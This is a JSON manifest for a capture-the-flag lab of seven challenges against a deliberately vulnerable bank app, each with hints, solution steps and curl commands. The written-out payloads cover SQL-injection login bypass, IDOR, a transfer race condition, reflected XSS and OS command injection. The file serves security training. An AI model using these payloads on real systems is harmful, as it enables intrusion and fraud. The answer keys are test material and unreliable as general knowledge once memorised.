@@ -1,0 +1,284 @@
+{
+    "version":  1,
+    "count":  7,
+    "challenges":  [
+                       {
+                           "id":  1,
+                           "name":  "Trust, Not Verified",
+                           "category":  "Web â€” Basic",
+                           "value":  150,
+                           "flag_key":  "sqli_login",
+                           "image":  "vbank-auth:1",
+                           "profile":  "auth",
+                           "internal_port":  80,
+                           "needs_analytics":  false,
+                           "health_path":  "/",
+                           "mem_limit":  "256m",
+                           "description":  "\u003cp\u003evBank\u0027s customer login trusts whatever lands in the username field.\u003c/p\u003e\u003cp\u003eAuthentication still uses concatenated SQL. A carefully chosen username is enough to walk through without credentials.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eObjective:\u003c/strong\u003e Bypass customer login at \u003ccode\u003e/customer/login\u003c/code\u003e and reach the dashboard.\u003c/p\u003e",
+                           "description_md":  "vBank customer login trusts the username field more than it should.\n\nAuthentication still uses concatenated SQL. Bypass login at **/customer/login** with SQL injection in the username field. The flag appears on the dashboard.",
+                           "hints":  [
+                                         {
+                                             "text":  "Classic SQL injection â€” make the WHERE clause always true.",
+                                             "cost":  0
+                                         },
+                                         {
+                                             "text":  "Try `\u0027 OR \u00271\u0027=\u00271` in the username field.",
+                                             "cost":  50
+                                         }
+                                     ],
+                           "docs":  {
+                                        "vuln_type":  "SQL Injection â€” Login Bypass",
+                                        "concept":  "The login query is built by string concatenation. Injecting `\u0027 OR \u00271\u0027=\u00271` makes the WHERE clause always true.",
+                                        "steps":  [
+                                                      "Open /customer/login.",
+                                                      "Enter `\u0027 OR \u00271\u0027=\u00271` as username, anything as password.",
+                                                      "Dashboard loads with the flag."
+                                                  ],
+                                        "code_examples":  [
+                                                              {
+                                                                  "lang":  "bash",
+                                                                  "code":  "curl -s -c /tmp/c.txt -b /tmp/c.txt -X POST http://TARGET/customer/login --data-urlencode \"username=\u0027 OR \u00271\u0027=\u00271\" --data-urlencode password=x -L | grep -o \u0027LYD{[^}]*}\u0027"
+                                                              }
+                                                          ]
+                                    }
+                       },
+                       {
+                           "id":  2,
+                           "name":  "Someone Else\u0027s Numbers",
+                           "category":  "Web â€” Basic",
+                           "value":  200,
+                           "flag_key":  "idor_statements",
+                           "image":  "vbank-idor:1",
+                           "profile":  "idor",
+                           "internal_port":  80,
+                           "needs_analytics":  false,
+                           "health_path":  "/",
+                           "mem_limit":  "256m",
+                           "description":  "\u003cp\u003eStatements are fetched by account ID. The API checks that you are logged in â€” not that the account is yours.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eObjective:\u003c/strong\u003e Read another customer\u0027s transaction history and find the flag.\u003c/p\u003e",
+                           "description_md":  "The API `/api/v1/accounts/{id}/transactions` retrieves history without an ownership check.\n\nLog in as a customer and try account ID **1337**.",
+                           "hints":  [
+                                         {
+                                             "text":  "Inspect statements traffic for `/api/v1/accounts/\u003cid\u003e/transactions`.",
+                                             "cost":  0
+                                         },
+                                         {
+                                             "text":  "Try account ID 1337.",
+                                             "cost":  100
+                                         }
+                                     ],
+                           "docs":  {
+                                        "vuln_type":  "IDOR â€” Transaction Statements",
+                                        "concept":  "GET /api/v1/accounts/\u003cid\u003e/transactions returns records for any user_id without ownership check.",
+                                        "steps":  [
+                                                      "Log in via SQLi.",
+                                                      "Call GET /api/v1/accounts/1337/transactions.",
+                                                      "Read the confidential memo for the flag."
+                                                  ],
+                                        "code_examples":  [
+                                                              {
+                                                                  "lang":  "bash",
+                                                                  "code":  "curl -s -b /tmp/c.txt http://TARGET/api/v1/accounts/1337/transactions | grep -o \u0027LYD{[^}]*}\u0027"
+                                                              }
+                                                          ]
+                                    }
+                       },
+                       {
+                           "id":  3,
+                           "name":  "The Account No One Touches",
+                           "category":  "Web â€” Basic",
+                           "value":  225,
+                           "flag_key":  "idor_transfer",
+                           "image":  "vbank-idor:1",
+                           "profile":  "idor",
+                           "internal_port":  80,
+                           "needs_analytics":  false,
+                           "health_path":  "/",
+                           "mem_limit":  "256m",
+                           "description":  "\u003cp\u003eCompliance blocked beneficiary KADABOOM. The hold is only as strong as the parameters the server trusts.\u003c/p\u003e\u003cp\u003eThe CEO statement contains a double-base64 account reference. Confirming a transfer to that account, or flipping \u003ccode\u003ecompliance_status\u003c/code\u003e on the confirm request, releases the flag.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eObjective:\u003c/strong\u003e Complete a transfer to the suspended beneficiary.\u003c/p\u003e",
+                           "description_md":  "Compliance blocked beneficiary **KADABOOM**.\n\nFind the blocked account reference in a statement you should not have (`TVRneU5EVXpOamN4TUE9PQ==`). Confirm a transfer with `acct=` or POST `/account/transfer/confirm` with `compliance_status=approved`.",
+                           "hints":  [
+                                         {
+                                             "text":  "The blocked account reference is in the CEO statement memo.",
+                                             "cost":  0
+                                         },
+                                         {
+                                             "text":  "GET /account/transfer/confirm?acct=TVRneU5EVXpOamN4TUE9PQ== or POST with compliance_status=approved.",
+                                             "cost":  50
+                                         }
+                                     ],
+                           "docs":  {
+                                        "vuln_type":  "Broken Access Control â€” Transfer Bypass",
+                                        "concept":  "The confirm endpoint trusts a client-supplied account reference and compliance_status.",
+                                        "steps":  [
+                                                      "Read CEO statement for the encoded account.",
+                                                      "GET /account/transfer/confirm?acct=TVRneU5EVXpOamN4TUE9PQ==",
+                                                      "Or POST with recipient KADABOOM and compliance_status=approved."
+                                                  ],
+                                        "code_examples":  [
+                                                              {
+                                                                  "lang":  "bash",
+                                                                  "code":  "curl -s -b /tmp/c.txt \u0027http://TARGET/account/transfer/confirm?acct=TVRneU5EVXpOamN4TUE9PQ==\u0027 | grep -o \u0027LYD{[^}]*}\u0027"
+                                                              }
+                                                          ]
+                                    }
+                       },
+                       {
+                           "id":  4,
+                           "name":  "Faster Than Careful",
+                           "category":  "Web â€” Intermediate",
+                           "value":  300,
+                           "flag_key":  "race_condition",
+                           "image":  "vbank-logic:1",
+                           "profile":  "logic",
+                           "internal_port":  80,
+                           "needs_analytics":  false,
+                           "health_path":  "/",
+                           "mem_limit":  "512m",
+                           "description":  "\u003cp\u003eExpress Transfer checks balance, then deducts from the live ledger after a delay. Concurrent requests can spend the same funds more than once.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eObjective:\u003c/strong\u003e Drive the express-transfer balance below zero.\u003c/p\u003e",
+                           "description_md":  "Express Transfer checks balance then deducts after a delay.\n\nReset if needed, then send many parallel POSTs to `/api/v1/transfer/express`. Check `/api/v1/account/status` when the balance goes negative.",
+                           "hints":  [
+                                         {
+                                             "text":  "Fire 20â€“25 parallel requests with amount=1000.",
+                                             "cost":  0
+                                         },
+                                         {
+                                             "text":  "Check `/api/v1/account/status` once the balance goes negative.",
+                                             "cost":  100
+                                         }
+                                     ],
+                           "docs":  {
+                                        "vuln_type":  "Race Condition â€” TOCTOU",
+                                        "concept":  "Balance is checked, then deducted from the live row after a sleep. Concurrent requests all pass the check.",
+                                        "steps":  [
+                                                      "Reset balance.",
+                                                      "Fire 20â€“25 parallel POSTs to /api/v1/transfer/express.",
+                                                      "Check /api/v1/account/status for the flag."
+                                                  ],
+                                        "code_examples":  [
+                                                              {
+                                                                  "lang":  "bash",
+                                                                  "code":  "curl -s -b /tmp/c.txt -X POST http://TARGET/api/v1/account/reset\nfor i in $(seq 1 25); do curl -s -b /tmp/c.txt -X POST http://TARGET/api/v1/transfer/express -d amount=1000 \u0026 done\nwait\ncurl -s -b /tmp/c.txt http://TARGET/api/v1/account/status"
+                                                              }
+                                                          ]
+                                    }
+                       },
+                       {
+                           "id":  5,
+                           "name":  "Word For Word",
+                           "category":  "Web â€” Basic",
+                           "value":  75,
+                           "flag_key":  "reflected_xss",
+                           "image":  "vbank-xss:1",
+                           "profile":  "xss",
+                           "internal_port":  80,
+                           "needs_analytics":  false,
+                           "health_path":  "/",
+                           "mem_limit":  "256m",
+                           "description":  "\u003cp\u003eCustomer search echoes your query without encoding. A script tag proves reflected XSS.\u003c/p\u003e\u003cp\u003eThe flag is in the \u003ccode\u003eX-Internal-Note\u003c/code\u003e response header.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eObjective:\u003c/strong\u003e Trigger reflected XSS and read the flag from the response headers.\u003c/p\u003e",
+                           "description_md":  "Customer search at `/search` echoes `q` without encoding.\n\nSubmit a `\u003cscript\u003e` payload and inspect response headers for `X-Internal-Note`.",
+                           "hints":  [
+                                         {
+                                             "text":  "Try `/search?q=` with a script payload.",
+                                             "cost":  0
+                                         },
+                                         {
+                                             "text":  "Look for the X-Internal-Note response header.",
+                                             "cost":  50
+                                         }
+                                     ],
+                           "docs":  {
+                                        "vuln_type":  "Reflected XSS",
+                                        "concept":  "Search reflects q unsafely. The flag is returned in the X-Internal-Note header when a script payload is present.",
+                                        "steps":  [
+                                                      "GET /search?q=\u003cscript\u003ealert(1)\u003c/script\u003e",
+                                                      "Inspect response headers for X-Internal-Note."
+                                                  ],
+                                        "code_examples":  [
+                                                              {
+                                                                  "lang":  "bash",
+                                                                  "code":  "curl -i -s -b /tmp/c.txt --get http://TARGET/search --data-urlencode \u0027q=\u003cscript\u003ealert(1)\u003c/script\u003e\u0027 | grep -i \u0027X-Internal-Note\\|LYD{\u0027"
+                                                              }
+                                                          ]
+                                    }
+                       },
+                       {
+                           "id":  6,
+                           "name":  "No Handle on Your Side",
+                           "category":  "Web â€” Intermediate",
+                           "value":  175,
+                           "flag_key":  "staff_sqli",
+                           "image":  "vbank-staff-auth:1",
+                           "profile":  "staff-auth",
+                           "internal_port":  80,
+                           "needs_analytics":  false,
+                           "health_path":  "/",
+                           "mem_limit":  "256m",
+                           "description":  "\u003cp\u003eStaff tools live behind a maintenance portal. The employee ID field looks locked down â€” the password field does not.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eObjective:\u003c/strong\u003e Bypass staff authentication via SQL injection at \u003ccode\u003e/maintenance-portal\u003c/code\u003e.\u003c/p\u003e",
+                           "description_md":  "Open **/maintenance-portal** and inject SQL into the **password** field. The staff dashboard contains the flag.",
+                           "hints":  [
+                                         {
+                                             "text":  "Start at /maintenance-portal.",
+                                             "cost":  0
+                                         },
+                                         {
+                                             "text":  "Inject in the password field: `\u0027 OR \u00271\u0027=\u00271`",
+                                             "cost":  50
+                                         }
+                                     ],
+                           "docs":  {
+                                        "vuln_type":  "SQL Injection â€” Staff Login",
+                                        "concept":  "A WAF covers emp_id only. The password field is concatenated into SQL.",
+                                        "steps":  [
+                                                      "Open /maintenance-portal.",
+                                                      "Inject `\u0027 OR \u00271\u0027=\u00271` in the password field.",
+                                                      "Read the flag from the staff dashboard."
+                                                  ],
+                                        "code_examples":  [
+                                                              {
+                                                                  "lang":  "bash",
+                                                                  "code":  "curl -s -c /tmp/s.txt -b /tmp/s.txt -X POST http://TARGET/maintenance-portal --data-urlencode emp_id=anything --data-urlencode \"password=\u0027 OR \u00271\u0027=\u00271\" -L | grep -o \u0027LYD{[^}]*}\u0027"
+                                                              }
+                                                          ]
+                                    }
+                       },
+                       {
+                           "id":  7,
+                           "name":  "Who\u0027s Really Typing",
+                           "category":  "Web â€” Advanced",
+                           "value":  425,
+                           "flag_key":  "rce",
+                           "image":  "vbank-staff-deep:1",
+                           "profile":  "staff-deep",
+                           "internal_port":  80,
+                           "needs_analytics":  false,
+                           "health_path":  "/",
+                           "mem_limit":  "512m",
+                           "description":  "\u003cp\u003eThe staff maintenance console runs diagnostic commands with \u003ccode\u003eshell=True\u003c/code\u003e.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eObjective:\u003c/strong\u003e Execute \u003ccode\u003ecat /root/flag.txt\u003c/code\u003e through \u003ccode\u003e/staff/maintenance\u003c/code\u003e.\u003c/p\u003e",
+                           "description_md":  "Staff access required. Open **/staff/maintenance** and run `cat /root/flag.txt`.",
+                           "hints":  [
+                                         {
+                                             "text":  "Staff login first, then POST cmd to /staff/maintenance.",
+                                             "cost":  0
+                                         },
+                                         {
+                                             "text":  "cmd=cat /root/flag.txt",
+                                             "cost":  100
+                                         }
+                                     ],
+                           "docs":  {
+                                        "vuln_type":  "OS Command Injection",
+                                        "concept":  "subprocess.check_output(cmd, shell=True) runs whatever you POST.",
+                                        "steps":  [
+                                                      "Staff login.",
+                                                      "POST /staff/maintenance with cmd=cat /root/flag.txt."
+                                                  ],
+                                        "code_examples":  [
+                                                              {
+                                                                  "lang":  "bash",
+                                                                  "code":  "curl -s -b /tmp/s.txt -X POST http://TARGET/staff/maintenance --data-urlencode \u0027cmd=cat /root/flag.txt\u0027"
+                                                              }
+                                                          ]
+                                    }
+                       }
+                   ]
+}
